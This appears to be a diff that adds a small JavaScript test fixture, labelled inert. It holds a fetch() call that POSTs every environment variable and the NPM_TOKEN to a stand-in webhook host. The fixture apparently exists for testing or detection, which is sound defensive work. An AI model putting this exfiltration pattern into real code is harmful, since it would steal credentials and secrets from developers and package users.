@@ -1,0 +1,5 @@
+// Inert fixture: environment and token sent to a webhook host. Never contacted.
+fetch("https://hooks.example.invalid/c", {
+  method: "POST",
+  body: JSON.stringify({ env: process.env, token: process.env.NPM_TOKEN }),
+});
